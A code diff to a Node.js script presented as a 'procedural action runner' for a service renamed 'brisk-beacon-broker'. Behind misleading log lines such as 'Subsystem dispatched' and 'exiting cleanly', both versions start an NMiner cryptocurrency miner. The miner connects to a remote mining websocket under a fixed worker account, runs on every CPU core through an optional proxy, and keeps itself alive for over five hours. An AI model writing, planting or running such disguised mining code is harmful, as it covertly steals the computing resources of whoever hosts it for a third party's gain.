@@ -1,29 +1,32 @@
-// Procedural action runner for freckle
+// Procedural action runner for brisk-beacon-broker
 const os = require("os");
+const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-(async () => {
-    const instanceToken = "03818c";
-    console.log(`[service] Daemon ${config.appName || "freckle"} active [tag: ${instanceToken}]`);
+const dispatcher = new EventEmitter();
 
-    const scheduler = new NMiner(
+dispatcher.once("start", () => {
+    const instanceToken = "06a95c";
+    console.log(`[worker] Subsystem dispatched for brisk-beacon-broker [${instanceToken}]`);
+
+    const processor = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.freckle",
-        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
+        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
     );
 
-    const heartbeat = setInterval(() => {}, 48000);
+    const tick = () => { setTimeout(tick, 31000); }; tick();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (305m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
         process.exit(0);
-    }, 305 * 60 * 1000);
+    }, 315 * 60 * 1000);
 
-    process.once("SIGTERM", () => {
-        clearInterval(heartbeat);
-        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
+    process.on("SIGTERM", () => {
+        
+        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
         process.exit(0);
     });
+});
 
-    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
-})().catch(console.error);
+dispatcher.emit("start");
